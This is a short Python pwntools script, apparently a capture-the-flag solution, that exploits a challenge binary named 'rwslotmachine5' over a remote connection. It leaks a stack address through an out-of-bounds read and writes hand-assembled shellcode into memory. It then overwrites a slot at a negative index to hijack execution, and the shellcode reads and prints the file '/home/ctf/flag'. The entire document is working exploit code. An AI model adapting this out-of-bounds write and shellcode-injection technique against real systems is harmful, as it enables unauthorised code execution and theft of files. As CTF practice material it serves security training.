from pwn import *

local = False

if local:
	p = process('../src/rwslotmachine5')
else:
	p = remote('141.85.224.117', 31348)

def do_read(idx):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil(']: ')
	return int(p.recvuntil('\n')[:-1], 16)

def do_write(idx, value):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(hex(value))

stack_leak = do_read(1)
stack_slots = stack_leak - 0x3e

shellcode = asm('''
	xor ecx, ecx
	xor eax, eax
	push 0x6761
	push 0x6c662f66
	push 0x74632f65
	push 0x6d6f682f
	mov ebx, esp
	mov al, 5
	int 0x80
	mov al, 5
	int 0x80
	mov ebx, eax
	mov ecx, esp
	xor edx, edx
	mov dl, 0x3f
	mov al, 3
	int 0x80
	mov bl, 1
	mov al, 4	
	int 0x80
	mov al, 252
	int 0x80
''')

shellcode_pieces = unpack_many(shellcode, 32)

for i in range(len(shellcode_pieces)):
	do_write(i, shellcode_pieces[i])

do_write(-8, stack_slots)

p.interactive()
